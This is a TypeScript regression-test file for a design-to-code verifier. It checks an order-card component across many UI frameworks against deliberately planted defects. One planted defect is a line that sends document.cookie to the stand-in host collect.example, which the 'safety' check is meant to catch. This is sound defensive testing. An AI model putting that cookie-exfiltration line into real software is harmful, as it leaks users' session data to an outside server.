// The regression gate: a design we wrote ourselves (an order card, built here as Figma's own REST JSON,
// so it lives in the public repo and CI needs no Figma cache) and a hand-written reference implementation
// per project in cli/test/golden. The reference must pass every check that runs, and each one-defect
// mutant must fail the right check. A change to the verifier, an adapter or a design system's version that
// breaks either fails CI, with no model and no spend.

import { existsSync, readdirSync, readFileSync } from "node:fs";
import { mkdir, rm, writeFile } from "node:fs/promises";
import { join, resolve } from "node:path";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import type { Check, VerifyReport } from "@tulpar/core";
import { loadContext, verifyEntry } from "../../src/pipeline.ts";
import { loadProject, withAdapter } from "../../src/project.ts";
import { orderCard, type Scale } from "../../src/order-card.ts";

export { orderCard };
import { flutterBin } from "../../../adapters/flutter/src/sdk.ts";
import { dotnetBin } from "../../../adapters/blazor/src/sdk.ts";
import { cargoFound } from "../../../adapters/leptos/src/sdk.ts";
import { crateSource } from "../../../adapters/leptos/src/components.ts";

const repo = resolve(import.meta.dirname, "../../..");
const golden = import.meta.dirname;

export interface Case {
  project: string;
  /** The reference folder in cli/test/golden. */
  reference: string;
  entry: string;
  /** The file holding the styles (the entry itself for a single-file component). */
  style: string;
  /** Its test file; none where the tests run on a remote machine (Blazor's bUnit). */
  test?: string;
  /** The checks that must have passed on the reference (default: the core checks, tests included). */
  ran?: Check["id"][];
  /** Planted defects that do not apply to this project (by name). */
  skipMutants?: string[];
  /** A line of the entry's script after which a planted call goes. */
  script: string;
  scale: Scale;
  /** Present when the project is installed. */
  needs: string;
  /** A project's own way to plant a mutant, by mutant name (Tailwind classes have no stylesheet to edit). */
  mutate?: Record<string, ((f: Files) => Files) | undefined>;
  /** False where the project's toolchain is missing (Flutter runs its tests on Linux, in the Flutter workflow). */
  available?: () => boolean;
}

export const cases: Record<string, Case> = Object.fromEntries(([
  {
    project: "examples/carbon-react",
    reference: "carbon-react",
    entry: "OrderCard.tsx",
    style: "OrderCard.css",
    test: "OrderCard.test.tsx",
    script: "}: OrderCardProps) {",
    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
    needs: "node_modules/@carbon/react",
  },
  {
    project: "examples/carbon-svelte",
    reference: "carbon-svelte",
    entry: "OrderCard.svelte",
    style: "OrderCard.svelte",
    test: "OrderCard.test.ts",
    script: '<script lang="ts">',
    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
    needs: "node_modules/carbon-components-svelte",
  },
  {
    project: "examples/carbon-angular",
    reference: "carbon-angular",
    entry: "order-card.component.ts",
    style: "order-card.component.css",
    test: "order-card.component.spec.ts",
    script: 'import { ChangeDetectionStrategy, Component, input } from "@angular/core";',
    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
    needs: "node_modules/carbon-components-angular",
  },
  {
    project: "examples/element-plus",
    reference: "element-plus",
    entry: "OrderCard.vue",
    style: "OrderCard.vue",
    test: "OrderCard.test.ts",
    script: '<script setup lang="ts">',
    scale: { font: "Inter", title: [20, 24], body: [14, 24], padding: 20, gap: 0 },
    needs: "node_modules/element-plus",
  },
  {
    // Typography sets the type (h6: 500 20/32, body2: 14/20); the stylesheet holds spacing and colour.
    project: "examples/mui",
    reference: "mui",
    entry: "OrderCard.tsx",
    style: "OrderCard.css",
    test: "OrderCard.test.tsx",
    script: "}: OrderCardProps) {",
    scale: { font: "Roboto", title: [20, 32], body: [14, 20], padding: 16, gap: 8, weights: [500, 400], colors: [[0.13, 0.13, 0.13], [0.4, 0.4, 0.4]] },
    needs: "node_modules/@mui/material",
    mutate: { "a button with no accessible name": (f) => edit(f, "OrderCard.tsx", (s) => s.replace('<Typography variant="h6"', '<button type="button"></button><Typography variant="h6"')) },
  },
  {
    project: "examples/chakra",
    reference: "chakra",
    entry: "OrderCard.tsx",
    style: "OrderCard.css",
    test: "OrderCard.test.tsx",
    script: "}: OrderCardProps) {",
    scale: { font: "Inter", title: [20, 30], body: [14, 21], padding: 16, gap: 8, weights: [600, 400], colors: [[0.0353, 0.0353, 0.0431], [0.3216, 0.3216, 0.3569]] },
    needs: "node_modules/@chakra-ui/react",
  },
  {
    project: "examples/radix",
    reference: "radix",
    entry: "OrderCard.tsx",
    style: "OrderCard.css",
    test: "OrderCard.test.tsx",
    script: "}: OrderCardProps) {",
    scale: { font: "Inter", title: [20, 28], body: [14, 20], padding: 16, gap: 8, weights: [500, 400], colors: [[0.125, 0.125, 0.125], [0.392, 0.392, 0.392]] },
    needs: "node_modules/@radix-ui/themes",
  },
  {
    // Web Components: one HTML file (script, style, markup) and a JavaScript test.
    project: "examples/carbon",
    reference: "carbon-wc",
    entry: "OrderCard.html",
    style: "OrderCard.html",
    test: "OrderCard.test.js",
    script: '<script type="module">',
    scale: { font: "IBM Plex Sans", title: [20, 28], body: [14, 20], padding: 16, gap: 8 },
    needs: "node_modules/@carbon/web-components",
  },
  {
    // PrimeNG has no type scale of its own: the app's (app.css, --app-*), PrimeNG's colours and spacing; LESS.
    project: "examples/primeng",
    reference: "primeng",
    entry: "order-card.component.ts",
    style: "order-card.component.less",
    test: "order-card.component.spec.ts",
    script: 'import { ChangeDetectionStrategy, Component, input } from "@angular/core";',
    scale: { font: "Inter", title: [20, 26], body: [14, 21], padding: 12, gap: 8, weights: [600, 400], colors: [[0.2, 0.2549, 0.3333], [0.3922, 0.4549, 0.5451]] },
    needs: "node_modules/primeng",
  },
  {
    // Line heights are ratios (dense 1.4): 20/28 and 14/19.6.
    project: "examples/shoelace",
    reference: "shoelace",
    entry: "OrderCard.html",
    style: "OrderCard.html",
    test: "OrderCard.test.js",
    script: '<script type="module">',
    scale: { font: "Inter", title: [20, 28], body: [14, 19.6], padding: 16, gap: 8, weights: [500, 400], colors: [[0.0941, 0.0941, 0.1059], [0.3214, 0.3214, 0.3566]] },
    needs: "node_modules/@shoelace-style/shoelace",
  },
  {
    // Blazor (C#) with MudBlazor: MudText's Typo (h6 500 20/32, body2 14/20), MudStack's spacing, the pa-4 class,
    // [Parameter] properties. Its bUnit tests run on a remote runner, so there are none here.
    project: "examples/blazor-mud",
    reference: "blazor",
    entry: "OrderCard.razor",
    style: "OrderCard.razor.css",
    script: "@code {",
    scale: { font: "Roboto", title: [20, 32], body: [14, 20], padding: 16, gap: 8, weights: [500, 400], colors: [[0.2588, 0.2588, 0.2588], [0.2588, 0.2588, 0.2588]] },
    needs: "obj/project.assets.json",
    available: () => !!dotnetBin(),
    ran: ["build", "render", "colors", "type", "spacing", "layout", "text", "safety", "reusable", "accessible"],
    skipMutants: ["a test that fails"],
    mutate: {
      "no padding: everything inside sits in the corner": (f) => edit(f, "OrderCard.razor", (s) => s.replace("order-card pa-4", "order-card")),
      "planted call that sends cookies to another server": (f) => edit(f, "OrderCard.razor", (s) => s.replace("@code {", "@code {\n    private readonly System.Net.Http.HttpClient leak = new();")),
      "content written in place": (f) => edit(f, "OrderCard.razor", (s) => s.replace(">@Summary<", ">Two items, ready to ship.<")),
      "a button with no accessible name": (f) => edit(f, "OrderCard.razor", (s) => s.replace('<MudText Typo="Typo.h6"', '<button type="button"></button><MudText Typo="Typo.h6"')),
    },
  },
  {
    // Leptos (Rust) with Thaw: Fluent's tokens (20/28 600, 14/20), #[prop] defaults, wasm tests in the browser.
    project: "examples/leptos-thaw",
    reference: "leptos",
    entry: "order_card.rs",
    style: "order_card.css",
    test: "order_card_test.rs",
    script: ") -> impl IntoView {",
    scale: { font: "Segoe UI", title: [20, 28], body: [14, 20], padding: 16, gap: 12, weights: [600, 400], colors: [[0.1412, 0.1412, 0.1412], [0.2588, 0.2588, 0.2588]] },
    needs: "Cargo.lock",
    // GitHub's runners have Rust but not the project's crates: only where Thaw's source has been fetched.
    available: () => cargoFound() && !!crateSource(join(repo, "examples/leptos-thaw"), "thaw"),
    mutate: {
      "content written in place": (f) => edit(f, "order_card.rs", (s) => s.replace("{summary}", '"Two items, ready to ship."')),
    },
  },
  {
    // Tailwind: the design system is the theme's classes, so the mutants edit classes, not a stylesheet.
    project: "examples/shadcn",
    reference: "shadcn",
    entry: "OrderCard.tsx",
    style: "OrderCard.tsx",
    test: "OrderCard.test.tsx",
    script: "}: OrderCardProps) {",
    scale: { font: "Geist", title: [20, 28], body: [14, 20], padding: 16, gap: 8, weights: [600, 400], colors: [[0.0394, 0.0394, 0.0394], [0.4515, 0.4515, 0.4515]] },
    needs: "node_modules/tailwindcss",
    mutate: {
      "hard-coded colour": (f) => edit(f, "OrderCard.tsx", (s) => s.replace("text-foreground", "text-[#0a0a0a]")),
      "no padding: everything inside sits in the corner": (f) => edit(f, "OrderCard.tsx", (s) => s.replace(" p-4", "")),
    },
  },
  {
    // Material 3's default theme: titleLarge 22/28 in onSurface, bodyMedium 14/20 in onSurfaceVariant, on surface;
    // spacing from the app's Space scale. Flutter runs its tests on Linux only, in the Flutter workflow.
    project: "examples/flutter-material",
    reference: "flutter",
    entry: "order_card.dart",
    style: "order_card.dart",
    test: "order_card_test.dart",
    script: "  Widget build(BuildContext context) {",
    scale: { font: "Roboto", title: [22, 28], body: [14, 20], padding: 16, gap: 8, colors: [[0.1137, 0.1059, 0.1255], [0.2863, 0.2706, 0.3098]], background: [0.9961, 0.9686, 1] },
    needs: "pubspec.yaml",
    available: () => process.platform !== "win32" && !!flutterBin(),
    mutate: {
      "hard-coded colour": (f) => edit(f, "order_card.dart", (s) => s.replace("color: scheme.onSurface)", "color: const Color(0xFF1D1B20))")),
      "no padding: everything inside sits in the corner": (f) => edit(f, "order_card.dart", (s) => s.replace("const EdgeInsets.all(Space.lg)", "EdgeInsets.zero")),
      "planted call that sends cookies to another server": (f) => edit(f, "order_card.dart", (s) => s.replace("  Widget build(BuildContext context) {", "  Widget build(BuildContext context) {\n    HttpClient().getUrl(Uri.parse('https://collect.example/'));")),
    },
  },
] satisfies Case[]).map((c) => [c.reference, c]));

type Files = Record<string, string>;
const edit = (files: Files, file: string, change: (s: string) => string): Files => ({ ...files, [file]: change(files[file]!) });
const mutants: { name: string; mutate: (f: Files, c: Case) => Files; fails: Check["id"]; detail: RegExp }[] = [
  {
    name: "hard-coded colour",
    mutate: (f, c) => edit(f, c.style, (s) => s.replace(/(\n\s*color: )var\(--[\w-]+, (#[0-9a-f]{6})\)/, "$1$2")),
    fails: "colors",
    detail: /#[0-9a-f]{6}|0x[0-9a-f]{8}/i,
  },
  {
    name: "wrong text",
    mutate: (f, c) => edit(f, c.entry, (s) => s.replace("Order summary", "Order sumary")),
    fails: "text",
    detail: /Order sumary/,
  },
  {
    name: "no padding: everything inside sits in the corner",
    mutate: (f, c) => edit(f, c.style, (s) => s.replace(/\n\s*padding: [^\n]*;/, "")),
    fails: "layout",
    detail: /900:2|900:3/,
  },
  {
    name: "planted call that sends cookies to another server",
    mutate: (f, c) => edit(f, c.entry, (s) => s.replace(c.script, `${c.script}\nfetch("https://collect.example/?c=" + document.cookie);`)),
    fails: "safety",
    detail: /calls the network/,
  },
  {
    name: "a test that fails",
    mutate: (f, c) => edit(f, c.test!, (s) => s.replace("Two items, ready to ship.", "Three items")),
    fails: "tests",
    detail: /./,
  },
  {
    // The summary written into the markup instead of shown through its input: a picture of one order.
    name: "content written in place",
    mutate: (f) =>
      Object.fromEntries(
        Object.entries(f).map(([path, s]) => [
          path,
          /[._-](test|spec)\./.test(path)
            ? s
            : s
                .replace(/\{\{\s*summary\(?\)?\s*\}\}|\{summary\}/, "Two items, ready to ship.")
                .replace("Text(summary,", "Text('Two items, ready to ship.',"),
        ]),
      ),
    fails: "reusable",
    detail: /"Two items, ready to ship\." is written in place/,
  },
  {
    // A button a screen reader announces as nothing: the real axe-core audit in the sandboxed page must catch it.
    name: "a button with no accessible name",
    mutate: (f) => {
      const at = Object.keys(f).find((p) => !/[._-](test|spec)\./.test(p) && f[p]!.includes("<h2"));
      return at ? edit(f, at, (s) => s.replace("<h2", '<button type="button"></button><h2')) : f;
    },
    fails: "accessible",
    detail: /Buttons must have discernible text \(button-name\)/,
  },
];

const failing = (r: VerifyReport) => r.checks.filter((c) => c.status === "fail").map((c) => `${c.id}: ${c.summary}\n  ${c.details.filter((d) => d.startsWith("✗")).join("\n  ")}`);

/** The gate for one project: call from a test file (one per project, so they run in parallel). */
export function goldenSuite(c: Case): void {
  const root = join(repo, c.project);
  describe.skipIf(!existsSync(join(root, c.needs)) || c.available?.() === false)(`golden: ${c.reference}`, { timeout: 180_000 }, () => {
    const reference: Files = Object.fromEntries(readdirSync(join(golden, c.reference)).map((f) => [f, readFileSync(join(golden, c.reference, f), "utf8")]));
    const design = orderCard(c.scale);
    const work = join(root, ".tulpar", "golden");

    async function run(name: string, files: Files): Promise<VerifyReport> {
      const folder = name.replace(/[^a-z0-9]+/gi, "-").toLowerCase();
      const dir = join(work, folder);
      await mkdir(dir, { recursive: true });
      for (const [f, content] of Object.entries(files)) await writeFile(join(dir, f), content);
      const rel = (f: string) => `.tulpar/golden/${folder}/${f}`;
      const project = await loadProject(root);
      return withAdapter(project, async (host) => {
        const ctx = await loadContext(host, project, { frame: "900:1", node: design }, join(repo, "out"), join(repo, ".cache/figma"));
        return (await verifyEntry(host, project, ctx, rel(c.entry), undefined, c.test ? rel(c.test) : undefined)).report;
      });
    }

    let baseline: VerifyReport;
    beforeAll(async () => {
      baseline = await run("reference", reference);
    }, 180_000);
    afterAll(() => rm(work, { recursive: true, force: true }));

    it("passes the reference: no check fails, and the core checks ran", () => {
      expect(failing(baseline)).toEqual([]);
      const ran = baseline.checks.filter((x) => x.status === "pass").map((x) => x.id);
      for (const id of c.ran ?? (["build", "render", "colors", "type", "spacing", "layout", "text", "tests", "safety"] as const)) expect(ran, `${id} did not pass`).toContain(id);
    });

    for (const m of mutants) {
      // A page of markup (Web Components) has no inputs: its content is the page's own.
      if (m.fails === "reusable" && c.entry.endsWith(".html")) continue;
      // Flutter draws on a canvas: the WCAG audit needs a page's markup.
      if (m.fails === "accessible" && c.entry.endsWith(".dart")) continue;
      if (c.skipMutants?.includes(m.name)) continue;
      it(`catches: ${m.name}`, async () => {
        const files = c.mutate?.[m.name]?.(reference) ?? m.mutate(reference, c);
        expect(files).not.toEqual(reference);
        const report = await run(m.name, files);
        const check = report.checks.find((x) => x.id === m.fails)!;
        expect(check.status, failing(report).join("\n")).toBe("fail");
        expect(check.details.join("\n") + check.summary).toMatch(m.detail);
      });
    }
  });
}
